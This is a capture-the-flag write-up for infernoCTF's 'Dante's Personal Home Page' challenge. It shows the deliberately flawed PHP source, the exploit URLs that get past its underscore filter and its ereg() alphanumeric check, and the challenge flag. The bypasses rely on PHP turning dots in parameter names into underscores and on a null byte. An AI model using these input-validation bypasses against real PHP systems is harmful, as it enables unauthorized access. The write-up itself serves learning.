# Dante's Personal Home Page
## 180

Dante has used some PHP on his site but it only allows magicians to enter. Show him your magical skills!!

Author : MrT4ntr4

# Solution

Our challenge is the following php file:
```php
<?php
include("flag.php");

if (isset ($_GET['__magic__'])) {
    $magic = $_GET['__magic__'];

    $check = urldecode($_SERVER['QUERY_STRING']); 

    if(preg_match("/_| /i", $check)) 
    { 
        die("Get yourself some coffee"); 
    } 

    if (ereg ("^[a-zA-Z0-9]+$", $magic) === FALSE)
        echo 'Only Alphanumeric accepted';
    else if (strpos ($magic, '$dark$') !== FALSE)
    {
        if (!is_array($magic)){
            echo "Congratulations! FLAG is : ".$flag;
        }
        else{
            die("You darn!!");
        }
    }
    else
        {
            die("Your magic doesn't work on me");
        }
} else {
  show_source(__FILE__);
}
?>
```

To get the flag, we need to pass some checks which looks like contradictions.

First of all, we need to set `__magic__`, but our url cant contain `_`.
```php
if (isset ($_GET['__magic__'])) {
    $magic = $_GET['__magic__'];

    $check = urldecode($_SERVER['QUERY_STRING']); 

    if(preg_match("/_| /i", $check)) 
    { 
        die("Get yourself some coffee"); 
    } 
```

After we succesfully complete the part above, we have to set the value to be alphanumeric only to continue, but to get the flag it has to contain `$dark$`.
```php
if (ereg ("^[a-zA-Z0-9]+$", $magic) === FALSE)
        echo 'Only Alphanumeric accepted';
    else if (strpos ($magic, '$dark$') !== FALSE)
    {
        if (!is_array($magic)){
            echo "Congratulations! FLAG is : ".$flag;
        }
```

## Bypassing no underline check:

For some dark magical reason, `$_GET['__magic__']` will also return `..magic..`. So we can use the following url parameter:

```
http://address:port?..magic..=arcane
```

## Bypassing alphanumeric check:

However, nothing but $dark$ magic will work on this mighty php wizard, but his `ereg()` charm protects him from any kind of non-alphanumeric magic.

However, his `ereg()` magic has a weakspot, and it only protects him until a null byte is encountered.

Casting the following will give us the flag:
```
http://address:port?..magic..=a%00$dark$
```

flag: `infernoCTF{1_gu3ss_y0ur_m4g1c_was_w4y_t00_d4rk}`

